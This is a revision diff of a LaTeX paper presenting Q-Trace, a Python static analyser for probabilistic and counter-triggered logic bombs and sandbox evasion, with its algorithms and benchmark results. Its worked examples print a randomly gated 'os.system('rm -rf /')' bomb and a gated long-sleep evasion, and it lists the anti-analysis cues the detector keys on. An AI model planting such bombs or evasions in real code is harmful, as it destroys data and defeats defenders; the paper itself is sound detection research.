-a \emph{gated} branch---an \texttt{if} whose test involves randomness or a counter
-comparison, the structural hallmark of a trigger. Crucially, sinks are
-\emph{receiver-aware}: a bare method name such as \texttt{.run()} or \texttt{.send()}
-is treated as dangerous only when its receiver is genuinely the dangerous module
-(e.g.\ \texttt{subprocess.run}, not Flask's \texttt{app.run}). A \texttt{subprocess}
-call with a list-literal argument and no \texttt{shell=True}---the safe form---is
-deliberately not raised, removing a common source of false positives.
-Algorithm~\ref{alg:sink} sketches the pass.
-
-\begin{algorithm}[!t]
-\caption{Sink-aware AST scan (gating)}
-\label{alg:sink}
-\begin{algorithmic}[1]
-\State $H \gets \emptyset$; $g \gets 0$ \Comment{$g$: gated-branch depth}
-\Function{Visit}{node}
-  \If{node is \textbf{If}}
-     \State $gated \gets$ \Call{IsGated}{node.test}
-     \If{$gated$} $g \gets g+1$ \EndIf
-     \State \Call{Visit}{node.body}; \textbf{if} $gated$ \textbf{then} $g \gets g-1$
-     \State \Call{Visit}{node.orelse}
-  \ElsIf{node is \textbf{Call} $\wedge$ \Call{IsSink}{node}}
-     \State $H \gets H \cup \{(\text{name}, \text{line}, g>0)\}$
-  \Else{ \Call{Visit}{children(node)}}
-  \EndIf
-\EndFunction
-\Function{IsGated}{test}
-  \State \Return $\exists n \in$ walk(test): $n$ calls \texttt{random.*}
-         $\vee$ $n$ is a comparison
-\EndFunction
-\end{algorithmic}
-\end{algorithm}
-
-\subsection{Taint pattern matcher}
-A taint pass propagates coarse taint labels (probabilistic, chained, entangled,
-danger) through assignments, augmented assignments, and function definitions, and
-classifies the resulting trigger topology: a single random guard (probabilistic), a
-counter reaching a threshold (chained), several coupled guards (entangled), or logic
-distributed across functions (cross-function). Steganographic channels are recognised
-from genuine char-code manipulation (\texttt{chr}+\texttt{ord}) or an XOR byte
-transform, not from ubiquitous \texttt{.encode()}/\texttt{.decode()} calls.
-
-\subsection{Classic OWASP/CWE rules}
-AST rules cover SQL injection, command injection, insecure deserialisation, disabled
-TLS, weak hashing/ciphers, insecure randomness, SSRF, path traversal, XXE, insecure
-temp files, and debug-mode exposure. Each rule is written to fire on the
-genuinely-unsafe (interpolated/dynamic) form and stay silent on the
-parameterised/constant-safe form, and each is paired with a safe-variant regression
-test.
-
-\subsection{Obfuscation, secrets, dependencies, symbolic, quantum-inspired}
-The obfuscation engine flags high-entropy encoded blobs that flow into
-\texttt{exec}/\texttt{eval} using the entropy+fractal signal above. The secrets
-scanner correlates provider-specific key patterns with imports and redacts matches.
-The dependency auditor checks manifests for typosquats/slopsquats by edit distance to
-a popularity model. The quantum-inspired channel contributes a bounded corroborating
-risk score only.
-
-\subsection{Sound symbolic reachability of gated sinks}\label{sec:symbolic}
-A chained bomb detonates only when an accumulated counter reaches a threshold. Naively
-treating \texttt{if k == 2} as reachable produces a false ``proof'' of danger; treating
-it as unreachable misses real bombs. Q-Trace models a counter as the sum of
-\emph{optional} increments: for $m$ guarded increments \texttt{if $g_i$: k += $c_i$}
-starting from $k_0$, the reachable values of $k$ are
-\begin{equation}
-k \in \Big\{\, k_0 + \textstyle\sum_{i\in T} c_i \;\Big|\; T \subseteq \{1,\dots,m\}\,\Big\},
-\end{equation}
-and the guard \texttt{k == t} is satisfiable iff $t-k_0$ is expressible as a subset sum
-of the $c_i$. Q-Trace encodes each increment as a Boolean-selected term and asks Z3
-whether the threshold equation is satisfiable under the path constraints. Thus
-\texttt{if k==2} with two independent \texttt{k += 1} guards is proven \emph{reachable}
-(select both), while \texttt{if k==99} with a single \texttt{k += 1} is proven
-\emph{unreachable}---no false proof, and the confidence bump of Algorithm~\ref{alg:conf}
-is applied only when reachability genuinely holds. This soundness is what lets the
-symbolic signal safely \emph{raise} confidence without manufacturing false positives.
-
-% =====================================================================
-\section{The Two-Axis, Sink-Aware Confidence Model}\label{sec:twoaxis}
-The heart of Q-Trace is the decision of \emph{when a detection should break the
-build}. We model two orthogonal quantities, following Bandit/OWASP
-practice~\cite{owasp,bandit} but making the second reachability-driven:
-\begin{itemize}
-\item \textbf{Severity} $s$ --- the impact \emph{if} the finding is real
-(Critical/High/Medium/Low), fixed per threat class and mapped to a CVSS-style score.
-\item \textbf{Confidence} $c$ --- the probability the finding is a true positive,
-computed \emph{per instance} from the evidence actually present.
-\end{itemize}
-The \textbf{CI gate is the conjunction}: a finding breaks the build iff
-\begin{equation}
-\textsc{gate}(f) \;=\; \big(s(f)\in\{\text{High},\text{Critical}\}\big)\;\wedge\;
-\big(c(f)\neq\text{Low}\big).
-\label{eq:gate}
-\end{equation}
-Severity alone never gates. Fig.~\ref{fig:flow} and Algorithm~\ref{alg:conf} give the
-confidence assignment procedure.
-
-\begin{figure*}[!t]
-\centering
-\includegraphics[width=\textwidth]{figA_confflow.pdf}
-\caption{Confidence decision model. A fired pattern is elevated to High only when a
-dangerous sink is reachable inside the gated branch (or symbolically proven
-reachable); a sink elsewhere in the file yields Medium; a pattern with no reachable
-payload collapses to Low---the key false-positive suppressor into which benign
-sampling and feature-flag code falls. A gated anti-analysis primitive is treated as
-the branch's payload and routed to High (Section~\ref{sec:anti}).}
-\label{fig:flow}
-\end{figure*}
-
-\begin{algorithm}[!t]
-\caption{Per-instance confidence assignment}
-\label{alg:conf}
-\begin{algorithmic}[1]
-\Require pattern $p$, sinks $S$ (some flagged \emph{evasion}), symbolic flag $u$
-\State $D \gets \{x\in S : \neg x.\text{evasion}\}$;\; $E \gets \{x\in S : x.\text{evasion}\}$
-\State $gD \gets \exists x\in D: x.\text{gated}$;\; $gE \gets \exists x\in E: x.\text{gated}$
-\If{$p=$ \textsc{stego}} $c \gets$ High \textbf{if} $D\neq\emptyset$ \textbf{else} Medium
-\ElsIf{$p=$ \textsc{antidebug}} $c \gets$ High \textbf{if} $gE$ \textbf{elif} $E\neq\emptyset$ Medium \textbf{else} Low
-\ElsIf{$gD$} $c \gets$ High
-\ElsIf{$D\neq\emptyset$} $c \gets$ Medium
-\ElsIf{$gE$} $c \gets$ High \Comment{gated evasion is the payload}
-\ElsIf{$E\neq\emptyset$} $c \gets$ Medium
-\Else{ $c \gets$ Low} \Comment{benign sampling lands here}
-\EndIf
-\If{$u \wedge c=$ Medium} $c \gets$ High \Comment{symbolic reachability bump}
-\EndIf
-\State \Return $c$
-\end{algorithmic}
-\end{algorithm}
-
-\subsection{Why sink-awareness is the right lever}
-The dominant false-positive source in probabilistic-trigger detection is flagging
-\texttt{random.random() < x} whenever it appears---even though the overwhelming
-majority of such expressions are benign A/B sampling, jitter, or feature flags. The
-discriminating question is not ``is there randomness?'' but ``does the guarded branch
-\emph{do} something dangerous?'' By elevating confidence only when a real
-execution/exfiltration sink is reachable inside the guard, and suppressing it to Low
-otherwise, the model keeps genuine bombs at High while dropping benign sampling to a
-non-gating note. Fig.~\ref{fig:sep} shows the effect on the corpus: malicious samples
-cluster at High confidence, benign samples at ``no finding'' or Low, with a clean
-margin at the gate boundary.
-
-\begin{figure}[!t]
-\centering
-\includegraphics[width=\columnwidth]{fig5_confidence.pdf}
-\caption{Two-axis separation on the corpus. Distribution of each sample's highest
-(severity$\cdot$confidence) finding. All 31 malicious samples land at or above the
-gate boundary; 32 of 34 benign samples produce no High+ finding at all, and the
-remaining two are held at Low confidence by design (Section~\ref{sec:miss}). No
-benign sample reaches the gate.}
-\label{fig:sep}
 \end{figure}
 
-\subsection{Ablation: the confidence axis is worth 5.9 points of precision}
-To isolate the value of the second axis we compare two gates on the identical corpus:
-a \emph{severity-only} gate (fire on any High/Critical finding) and the \emph{two-axis}
-gate of~\eqref{eq:gate}. Fig.~\ref{fig:ablrefine}(a) reports the result. The severity-only
-gate achieves 100\pct{} recall but a 5.9\pct{} false-positive rate---two benign
-hard-negatives break the build. The two-axis gate drives the false-positive rate to
-\textbf{0\pct{}} at the cost of a single borderline detection (recall 96.8\pct{}). For
-a CI gate this is decisively the right trade: the eliminated false positives are
-exactly the kind that erode trust and cause abandonment~\cite{johnson,bessey},
-whereas the one suppressed detection remains visible as a Medium/Low note for a human
-reviewer.
+\subsection{Detection engines}\label{sec:engines}
+The catalogue spans 28 rules across 18 CWEs (15 High, 5 Critical, 8 Medium
+severity; see Appendix~\ref{app:catalog}). We summarise the engines and defer the
+scorer to Section~\ref{sec:model}.
 
-\begin{figure*}[!t]
+A sink-aware AST scan locates dangerous sinks and records, for each, whether it
+lies inside a gated branch, defined as an \texttt{if} whose test involves
+randomness or a counter comparison (Algorithm~\ref{alg:sink}). Sinks are
+receiver-aware: a method name such as \texttt{.run()} is treated as dangerous only
+when its receiver is the dangerous module, for example \texttt{subprocess.run}
+rather than a web framework's \texttt{app.run}. A \texttt{subprocess} call with a
+list-literal argument and no \texttt{shell=True}, the safe form, is not raised.
+
+A taint pass propagates coarse labels through assignments and function
+definitions and classifies the trigger topology: a single random guard
+(probabilistic), a counter reaching a threshold (chained), several coupled guards
+(entangled), or logic distributed across functions (cross-function).
+Steganographic channels are recognised from genuine char-code manipulation
+(\texttt{chr} with \texttt{ord}) or an XOR transform, not from ordinary
+\texttt{encode}/\texttt{decode} calls. Classic OWASP and CWE rules cover the
+injection, deserialisation, TLS, hashing, SSRF, traversal, and XXE classes, each
+written to fire on the dynamic or interpolated form and to stay silent on the
+parameterised or constant-safe form. The obfuscation engine flags high-entropy
+encoded blobs that flow into \texttt{exec} or \texttt{eval}. A secrets scanner
+correlates provider key patterns with imports, and a dependency auditor checks
+manifests for typosquats and slopsquats.
+
+\begin{algorithm}[t]
+\caption{Sink-aware AST scan with branch gating.}
+\label{alg:sink}
+\begin{algorithmic}[1]
+\State $H \gets \emptyset$;\; $g \gets 0$ \Comment{$g$: gated-branch depth}
+\Function{Visit}{node}
+  \If{node is \textbf{If}}
+     \State $\textit{gated} \gets \Call{IsGated}{\text{node.test}}$
+     \If{$\textit{gated}$}\; $g \gets g+1$\; \EndIf
+     \State \Call{Visit}{node.body};\; \textbf{if } $\textit{gated}$ \textbf{ then } $g \gets g-1$
+     \State \Call{Visit}{node.orelse}
+  \ElsIf{node is \textbf{Call} $\wedge$ \Call{IsSink}{node}}
+     \State $H \gets H \cup \{(\text{name},\text{line},\, g>0)\}$
+  \Else\; \Call{Visit}{children(node)}
+  \EndIf
+\EndFunction
+\State \textbf{return} $\Call{IsGated}{t} \equiv \exists n \in \text{walk}(t):
+   n \text{ calls } \texttt{random.*} \vee n \text{ is a comparison}$
+\end{algorithmic}
+\end{algorithm}
+
+\subsection{Sound symbolic reachability}\label{sec:symbolic}
+A chained bomb detonates only when an accumulated counter reaches a threshold.
+Treating \texttt{if k == 2} as reachable by default produces a false proof of
+danger, whereas treating it as unreachable misses real bombs. Q-Trace models a
+counter as a sum of optional increments. For $m$ guarded increments
+\texttt{if $g_i$: k += $c_i$} from an initial value $k_0$, the reachable values of
+$k$ are
+\begin{equation}
+k \in \Big\{\, k_0 + \textstyle\sum_{i\in T} c_i \ \Big|\ T \subseteq \{1,\dots,m\} \Big\},
+\end{equation}
+so the guard \texttt{k == t} is satisfiable if and only if $t - k_0$ is a subset
+sum of the $c_i$. Q-Trace encodes each increment as a Boolean-selected term and
+asks Z3~\cite{z3} whether the threshold equation is satisfiable under the path
+constraints. Consequently \texttt{if k == 2} with two independent \texttt{k += 1}
+guards is proven reachable, while \texttt{if k == 99} with a single increment is
+proven unreachable. This soundness lets the symbolic signal raise confidence
+without introducing false positives.
+
+\section{The Two-Axis Confidence Model}\label{sec:model}
+The scorer decides when a detection should break the build. Following the
+severity-and-confidence practice of Bandit and OWASP~\cite{bandit,owasp}, it
+models two quantities. Severity $s$ is the impact if the finding is real
+(Critical, High, Medium, or Low), fixed per threat class. Confidence $c$ is the
+probability that the finding is a true positive, computed per instance from the
+evidence present. The CI gate is the conjunction
+\begin{equation}
+g(f) = \big[\, s(f) \in \{\text{High},\text{Critical}\} \,\big] \wedge
+       \big[\, c(f) \neq \text{Low} \,\big].
+\label{eq:gate}
+\end{equation}
+Severity alone never gates. Figure~\ref{fig:flow} and Algorithm~\ref{alg:conf}
+give the confidence assignment.
+
+\begin{figure}[t]
 \centering
-\includegraphics[width=\textwidth]{fig_ablrefine.pdf}
-\caption{(a) Confidence-axis ablation: removing the confidence axis (severity-only
-gate) recovers one detection but introduces two false positives (5.9\pct{} FP); the
-two-axis gate trades 3.2 points of gate-recall for the elimination of \emph{all} false
-positives. (b) Effect of the evidence-based anti-analysis refinement: it improves
-gate-recall and $F_1$ while removing two false-positive classes and adding
-debugger-detection coverage. Prior-version values were measured on the same corpus at
-the start of this work.}
-\label{fig:ablrefine}
-\end{figure*}
+\includegraphics[width=\textwidth]{figA_confflow.pdf}
+\caption{Confidence assignment. A fired pattern reaches High confidence only when
+a dangerous sink is reachable inside the gated branch, or is proven reachable
+symbolically. A sink elsewhere in the file yields Medium. A pattern with no
+reachable payload yields Low, the level into which benign sampling and feature-flag
+code falls. A gated anti-analysis primitive is treated as the branch payload and
+routed to High.}
+\label{fig:flow}
+\end{figure}
 
-\subsection{Context-aware down-grading}
-A vulnerability in a test fixture, example, benchmark, or documentation file is almost
-always intentional. Q-Trace keeps such findings visible but forces them to Low
-confidence when the file path matches a test/example context, so they never break a
-CI gate. This is what keeps the scanner quiet on real repositories, every one of which
-ships a \texttt{tests/} tree.
+\begin{algorithm}[t]
+\caption{Per-instance confidence assignment.}
+\label{alg:conf}
+\begin{algorithmic}[1]
+\Require pattern $p$; sinks $S$, some flagged \emph{evasion}; symbolic flag $u$
+\State $D \gets \{x \in S : \neg x.\textit{evasion}\}$;\quad
+       $E \gets \{x \in S : x.\textit{evasion}\}$
+\State $g_D \gets \exists x \in D: x.\textit{gated}$;\quad
+       $g_E \gets \exists x \in E: x.\textit{gated}$
+\If{$p = \textsc{stego}$}\; $c \gets \textbf{High if } D \neq \emptyset \textbf{ else Medium}$
+\ElsIf{$p = \textsc{antidebug}$}\; $c \gets \textbf{High if } g_E \textbf{ elif } E\neq\emptyset \textbf{ Medium else Low}$
+\ElsIf{$g_D$}\; $c \gets \text{High}$
+\ElsIf{$D \neq \emptyset$}\; $c \gets \text{Medium}$
+\ElsIf{$g_E$}\; $c \gets \text{High}$ \Comment{gated evasion is the payload}
+\ElsIf{$E \neq \emptyset$}\; $c \gets \text{Medium}$
+\Else\; $c \gets \text{Low}$ \Comment{benign sampling lands here}
+\EndIf
+\If{$u \wedge c = \text{Medium}$}\; $c \gets \text{High}$ \Comment{reachability bump}
+\EndIf
+\State \textbf{return} $c$
+\end{algorithmic}
+\end{algorithm}
 
-% =====================================================================
-\section{Worked Examples}\label{sec:worked}
-We trace the two-axis model end-to-end on three inputs to make its behaviour concrete.
+\paragraph{Why sink-awareness.}
+The main source of false positives in probabilistic-trigger detection is flagging
+\texttt{random.random() < x} wherever it appears, although most such expressions
+are benign sampling, jitter, or feature flags. The discriminating question is
+whether the guarded branch performs a dangerous action, not whether randomness is
+present. Raising confidence only when a reachable execution or exfiltration sink
+lies inside the guard, and suppressing it to Low otherwise, keeps genuine bombs at
+High while dropping benign sampling to a non-gating note.
 
-\emph{Example 1 --- a real bomb (gates).} Given
-\texttt{if random.random()<0.14: os.system('rm -rf /')}, the sink scan finds
-\texttt{os.system} at a line whose enclosing \texttt{if} is gated (its test contains a
-\texttt{random} call and a comparison), so the sink is recorded with
-$\text{gated}=\text{true}$. The taint matcher labels the construct
-\textsc{probabilistic-bomb} (severity High). In Algorithm~\ref{alg:conf} the gated
-dangerous sink yields $c=\text{High}$; by~\eqref{eq:gate} the finding gates the build.
-Correct: this is a true positive.
+\paragraph{Worked examples.}
+Three inputs make the behaviour concrete. For
+\texttt{if random.random()<0.14: os.system('rm -rf /')}, the sink scan records
+\texttt{os.system} inside a gated branch, so $g_D$ holds and $c = \text{High}$; by
+\eqref{eq:gate} the finding gates. For
+\texttt{if random.random()<0.1: log\_metric('b')}, the same pattern fires but no
+dangerous sink lies in the branch, so $c = \text{Low}$ and the build stays green.
+For \texttt{if random.random()<0.09: time.sleep(99999)}, there is no classic sink,
+yet the gated stalling sleep is recorded as an evasion payload; $g_E$ holds and the
+High-severity bomb view gates, the behaviour added in Section~\ref{sec:anti}.
 
-\emph{Example 2 --- benign sampling (suppressed).} Given
-\texttt{if random.random()<0.1: log\_metric('variant\_b')}, the pattern still fires
-(\textsc{probabilistic-bomb}, High severity), but the sink scan finds \emph{no}
-dangerous sink in the guarded branch---\texttt{log\_metric} is not an
-execution/exfiltration sink. Algorithm~\ref{alg:conf} therefore assigns $c=\text{Low}$,
-and~\eqref{eq:gate} keeps the build green. This is the key false-positive suppression:
-the same syntactic pattern is separated from the bomb purely by the reachable payload.
+\paragraph{Context-aware down-grading.}
+A vulnerability in a test fixture, example, or documentation file is usually
+intentional. Q-Trace keeps such findings visible but forces them to Low confidence
+when the file path matches a test or example context, which prevents alerts on the
+test trees that most repositories ship.
 
-\emph{Example 3 --- a stalling evasion bomb (gates via the evasion path).} Given
-\texttt{if random.random()<0.09: time.sleep(99999)}, there is no classic sink, but the
-sink scan records \texttt{time.sleep} with a large constant argument inside a gated
-branch as an \emph{evasion} hit. The matcher emits both \textsc{probabilistic-bomb} and
-\textsc{anti-debug}. In Algorithm~\ref{alg:conf} the gated evasion primitive
-($gE$) elevates confidence to High, so the High-severity bomb view gates the build---
-the behaviour contributed by Section~\ref{sec:anti}. An unconditional
-\texttt{time.sleep(3600)} in a daemon loop takes the $E=\emptyset$ branch and stays
-silent.
-
-% =====================================================================
 \section{Evidence-Based Anti-Analysis Detection}\label{sec:anti}
-Anti-analysis (sandbox-evasion) behaviour---MITRE ATT\&CK T1497~\cite{attack}---is a
-strong malice indicator: benign code rarely tries to detect whether it is being
-observed. The challenge is detecting it \emph{precisely}. A na\"ive rule that flags
-any call named \texttt{sleep} or any identifier containing the substring ``debug'' is
-both over- and under-inclusive: it false-flags ordinary \texttt{log.debug()} logging
-and short retry \texttt{time.sleep(0.1)} calls, while entirely missing debugger
-detection via \texttt{sys.gettrace()}. This work replaces that heuristic with an
-evidence-based rule.
+Anti-analysis behaviour, catalogued as MITRE ATT\&CK T1497~\cite{attack}, is a
+strong indicator of malice, because benign code rarely checks whether it is being
+observed. The difficulty is detecting it precisely. A rule that flags any call
+named \texttt{sleep} or any identifier containing ``debug'' is both over- and
+under-inclusive: it flags ordinary \texttt{log.debug()} logging and short retry
+sleeps, yet misses debugger detection through \texttt{sys.gettrace()}. Q-Trace
+raises an anti-analysis signal on two evidence classes only. The first is
+debugger or tracer detection, a call to \texttt{sys.gettrace} or
+\texttt{sys.settrace}, which is always flagged. The second is a conditionally
+gated stalling sleep, a \texttt{time.sleep(N)} with a large constant
+($N \geq 600$~s) inside a conditional branch; an unconditional long sleep in a
+daemon loop is not evasion, so gating on the branch preserves precision. When a
+stalling sleep lies inside a random-gated branch, the construct is both a
+probabilistic logic bomb and an anti-analysis payload. The evasion primitive is
+treated as the branch payload, so the two-axis model elevates it to High
+confidence in the same way as a real sink, and the sleep is never reported as a
+CWE-78 execution sink.
 
-\subsection{The refined rule}
-An anti-analysis signal is now raised on exactly two evidence classes:
-\begin{itemize}
-\item \textbf{Debugger/tracer detection} --- a call to \texttt{sys.gettrace} or
-\texttt{sys.settrace} (also \texttt{threading.settrace}). Code that inspects the trace
-hook is checking whether it is under observation. It is always flagged.
-\item \textbf{Conditionally-gated stalling sleep} --- a \texttt{time.sleep(N)} with a
-large constant argument ($N \geq 600$\,s) \emph{inside a conditional branch}. A
-multi-hour sleep that fires only sometimes is a sandbox-timeout evasion; an
-unconditional long sleep in a daemon poll loop is not, so gating on the conditional
-branch preserves precision.
-\end{itemize}
-When a stalling sleep sits inside a random-gated branch, the construct is
-simultaneously a probabilistic logic bomb and an anti-analysis payload; we report both
-views and, critically, treat the evasion primitive as the branch's \emph{payload} so
-that the two-axis model elevates it to High confidence exactly as a real exec sink
-would (Algorithm~\ref{alg:conf}, lines for $gE$). The stalling sleep is never itself
-reported as an execution (CWE-78) sink---only as anti-analysis---so its semantic label
-stays correct.
+Figure~\ref{fig:ablrefine}(b) quantifies the change against the prior version of
+the engine on the same corpus. CI-gate recall rises from 93.5\pct{} to 96.8\pct{}
+and $F_1$ from 0.967 to 0.984; two false-positive classes are removed; and
+debugger-detection coverage changes from absent to present, with the
+false-positive rate unchanged at zero. The refinement ships with five regression
+tests.
 
-\subsection{Measured effect}
-Fig.~\ref{fig:ablrefine}(b) quantifies the change against the immediately-prior version of
-the engine, measured on the same corpus. CI-gate recall rises from 93.5\pct{} to
-96.8\pct{} and $F_1$ from 0.967 to 0.984; two false-positive classes
-(\texttt{log.debug}, short retry sleep) are removed; and debugger-detection coverage
-goes from absent to present---all with the 0\pct{} false-positive rate preserved. The
-refinement ships with five regression tests that lock in both the new detections and
-the precision cases.
-
-
-
-% =====================================================================
-\section{Implementation}
-Q-Trace is implemented in pure Python with a small, optional native acceleration
-path. It has two dependencies for full functionality---\texttt{numpy} (quantum-inspired
-channel) and \texttt{z3-solver} (symbolic reachability)---both treated as optional by
-the self-healing layer: their absence degrades the corresponding engine rather than
-breaking the audit. Parsing uses the standard-library \texttt{ast} module, with a
-token-based fallback for source that does not parse, so the scanner still produces
-line-anchored findings on inputs that defeat a strict parser. The CI gate
-of~\eqref{eq:gate} is a two-line predicate:
-
+\section{Implementation}\label{sec:impl}
+Q-Trace is implemented in Python. It has two dependencies for full function,
+\texttt{numpy} for the auxiliary risk channel and \texttt{z3-solver} for symbolic
+reachability, both treated as optional by the self-healing layer. Parsing uses the
+standard-library \texttt{ast} module, with a token-based fallback for source that
+does not parse, so the scanner still returns line-anchored findings on inputs that
+defeat a strict parser. The CI gate of \eqref{eq:gate} is a short predicate:
 \begin{lstlisting}
 def is_ci_alert(findings):
-    return any(f.severity in ("Critical","High")
-               and f.confidence != "Low"
-               for f in findings)
+    return any(f.severity in ("Critical", "High")
+               and f.confidence != "Low" for f in findings)
 \end{lstlisting}
 
-The quantum-\emph{inspired} risk channel is a self-contained pure-numpy state-vector
-simulator (RY/H/X/CNOT gates plus sampling) that replaces a heavyweight external
-quantum library, yielding an order-of-magnitude faster import and a footprint of a few
-kilobytes while producing identical mathematics. It is a bounded corroborating score,
-validated against a reference implementation, and does not by itself raise or gate any
-finding.
+\section{Evaluation}\label{sec:eval}
+\subsection{Corpus and methodology}
+The corpus contains 65 samples, 31 malicious and 34 benign. The malicious samples
+are reconstructions of techniques documented in public incident write-ups (W4SP,
+the Hades install hook, a WAV-XOR loader, aiocpa, slopsquatting, environment
+keying, and an AI-scanner-evasion campaign). We use reconstructions for two
+reasons of research integrity: the original binaries are neither redistributable
+nor fetchable offline, and a reconstruction lets a reader inspect exactly what is
+detected. The benign samples are hard negatives, that is, everyday code on which
+SAST tools frequently raise false alarms: safe \texttt{subprocess} with a list
+argument, \texttt{md5} marked \texttt{usedforsecurity=False}, \texttt{random} for
+sampling, parameterised SQL, \texttt{verify=True}, character formatting, CI
+environment checks, and legitimate dependencies.
 
-% =====================================================================
-\section{Deployment in Continuous Integration}\label{sec:deploy}
-Q-Trace is designed to sit in a pull-request gate. A typical invocation is
-\texttt{python cli.py scan src/ -{}-min-severity Medium -{}-fail-on High}, which exits
-non-zero (breaking the build) only when a finding satisfies~\eqref{eq:gate}. Three
-properties make this practical at scale.
+Each tool runs at its recommended gate: Bandit at MEDIUM or higher severity,
+Semgrep at WARNING or higher, and Q-Trace at High or higher severity with
+confidence above Low. Because Bandit and Semgrep cannot process dependency
+manifests, those corpus rows are excluded from their denominators; scoring a tool
+on inputs it cannot read would be misleading. Semgrep runs against an offline
+reimplementation of the standard public Python-security rules, because its
+registry is unreachable in an air-gapped setting. On the classic classes the tools
+tie by construction, which is the intended baseline; separation appears only on the
+classes that need cross-file taint, dependency intelligence, or secret-to-sink
+correlation.
 
-\emph{Determinism.} The analysis is a pure function of the input bytes: no network, no
-model, no randomness. The same commit always yields the same findings and the same
-\texttt{partialFingerprints}, so a green build stays green and a suppression is stable
-across re-runs---a prerequisite for a gate developers trust.
+\subsection{Results}
+Table~\ref{tab:head} and Fig.~\ref{fig:compare} summarise the comparison. Q-Trace
+detects the correct threat category for all 31 malicious samples and issues a
+build-breaking alert for 30 of them at a 0\pct{} false-positive rate
+(precision 100\pct{}, $F_1 = 0.984$). Semgrep reaches 66\pct{} recall at 3.1\pct{}
+false positives, and Bandit 52\pct{} at 6.2\pct{}. Figure~\ref{fig:cm} (left) gives the
+Q-Trace confusion matrix, and (right) shows the separation the confidence axis
+produces: malicious samples concentrate at High confidence and benign samples at
+Low or at no finding, with no benign sample reaching the gate.
 
-\emph{Standard interchange.} SARIF~2.1.0~\cite{sarif} output uploads directly to GitHub
-Code Scanning and DefectDojo, so findings appear inline on the diff with CWE links and
-a deterministic attack narrative, rather than as an opaque exit code. Fingerprints
-deduplicate a finding across commits so a known-accepted item does not re-alert.
-
-\emph{Air-gap.} Because nothing leaves the host, Q-Trace can run inside the same
-isolated runner that builds proprietary code, with no data-exfiltration or
-model-provenance concerns---an operational property that cloud SAST cannot offer.
-
-The gate is tunable along both axes independently: a team may gate on
-\texttt{-{}-fail-on Critical} only, or raise the confidence floor, without editing
-rules. Because severity and confidence are reported separately in every finding,
-triagers can filter ``High severity but Medium confidence'' items into a review queue
-instead of a hard block---operationalising the two-axis model as workflow, not just as
-a gate boolean.
-
-% =====================================================================
-\section{Experimental Methodology and Results}\label{sec:eval}
-\subsection{Corpus construction}
-Our corpus contains \textbf{65 samples: 31 malicious and 34 benign.} The malicious
-samples are \emph{faithful reconstructions} of techniques documented in public
-incident write-ups (W4SP, the Hades \texttt{.pth} install hook, the telnyx WAV-XOR
-loader, aiocpa, slopsquatting, environment keying, and the Shai-Hulud
-AI-scanner-evasion campaign). We use reconstructions rather than live malware for two
-reasons of research integrity: the original binaries are neither redistributable nor
-fetchable in an air-gapped setting, and a reconstruction lets a reader inspect exactly
-what is being detected. The benign samples are deliberately \emph{hard
-negatives}---everyday code that classic SAST tools frequently false-positive on: safe
-\texttt{subprocess} with a list argument, \texttt{md5} marked
-\texttt{usedforsecurity=False}, \texttt{random} for sampling, parameterised SQL,
-\texttt{verify=True}, \texttt{chr}/\texttt{ord} in string formatting, CI environment
-checks, and legitimate dependencies. This is where the false-positive rate is honestly
-stressed.
-
-\subsection{Metrics and gates}
-We report \emph{category recall} (did the tool assign the correct threat category?),
-\emph{CI-gate recall} (did a build-breaking alert fire on malware?),
-\emph{false-positive rate} (did benign code break the build?), precision, and $F_1$.
-Each tool runs at its own recommended actionable gate: Bandit at MEDIUM+ severity,
-Semgrep at WARNING+ severity, Q-Trace at High+ severity \emph{and} confidence
-$\neq$ Low. Because Bandit and Semgrep cannot process dependency manifests, those
-corpus rows are excluded from \emph{their} denominators---scoring a tool on inputs it
-structurally cannot read would be dishonest. Semgrep runs against an offline
-reimplementation of the standard public python-security ruleset, because its registry
-is unreachable in an air-gapped/CI environment; on the classic OWASP/CWE categories the
-tools are expected to tie, and that parity is the point.
-
-\subsection{Headline results}
-Table~\ref{tab:head} and Fig.~\ref{fig:quad} summarise the head-to-head. Q-Trace
-attains 100\pct{} category recall and a \textbf{96.8\pct{} CI-gate recall at 0\pct{}
-false positives} (precision 100\pct{}, $F_1\,0.984$). On the shared \texttt{.py}
-subset it flags 30/31 malware at 0/34 FP (97\pct{}/0\pct{}), versus Semgrep 19/29 at
-1/32 FP (66\pct{}/3.1\pct{}) and Bandit 15/29 at 2/32 FP (52\pct{}/6.2\pct{}).
-Figs.~\ref{fig:compare}--\ref{fig:compare} break out recall, false-positive rate, and $F_1$
-per tool; Fig.~\ref{fig:cm} is the Q-Trace confusion matrix.
-
-\begin{table}[!t]
-\renewcommand{\arraystretch}{1.3}
-\caption{Same-corpus head-to-head, each tool at its own recommended CI gate. External
-tools are scored only on inputs they can process. $F_1$ is on the shared code corpus.}
+\begin{table}[t]
+\centering
+\caption{Same-corpus comparison at each tool's recommended CI gate. External tools
+are scored only on inputs they can process; $F_1$ is on the shared code corpus.}
 \label{tab:head}
-\centering\footnotesize
+\footnotesize
 \begin{tabular}{@{}lccc@{}}
 \toprule
-\textbf{Tool} & \textbf{Malware recall} & \textbf{False-pos.\ rate} & \textbf{$F_1$}\\
+\textbf{Tool} & \textbf{Malware recall} & \textbf{False-positive rate} & \textbf{$F_1$}\\
 \midrule
-\textbf{Q-Trace} & 30/31 = 96.8\pct{} & 0/34 = 0.0\pct{} & \textbf{0.984}\\
+Q-Trace & 30/31 = 96.8\pct{} & 0/34 = 0.0\pct{} & \textbf{0.984}\\
 Semgrep & 19/29 = 65.5\pct{} & 1/32 = 3.1\pct{} & 0.776\\
-Bandit & 15/29 = 51.7\pct{} & 2/32 = 6.2\pct{} & 0.652\\
+Bandit  & 15/29 = 51.7\pct{} & 2/32 = 6.2\pct{} & 0.652\\
 \bottomrule
 \end{tabular}
 \end{table}
 
-\begin{figure}[!t]
-\centering
-\includegraphics[width=\columnwidth]{fig2_quadrant.pdf}
-\caption{Recall vs.\ false-positive quadrant. The ideal tool sits in the top-left
-corner (high recall, low FP). Q-Trace occupies it; Semgrep and Bandit trade recall for
-a non-zero false-positive rate. Each tool is plotted at its own recommended CI gate.}
-\label{fig:quad}
-\end{figure}
-
-\begin{figure*}[!t]
+\begin{figure}[t]
 \centering
 \includegraphics[width=\textwidth]{fig_compare.pdf}
-\caption{Same-corpus head-to-head at each tool's own recommended CI gate:
-(a) malware recall, (b) false-positive rate on benign hard-negatives, and (c) $F_1$.
-Bars are hatched for black-and-white legibility. Q-Trace attains the highest recall
-\emph{and} the only zero false-positive rate; the false positives Bandit and Semgrep
-raise are exactly the everyday-code patterns that drive alert fatigue.}
+\caption{Same-corpus comparison at each tool's recommended gate: (a) malware
+recall, (b) false-positive rate on benign hard negatives, and (c) $F_1$. Bars are
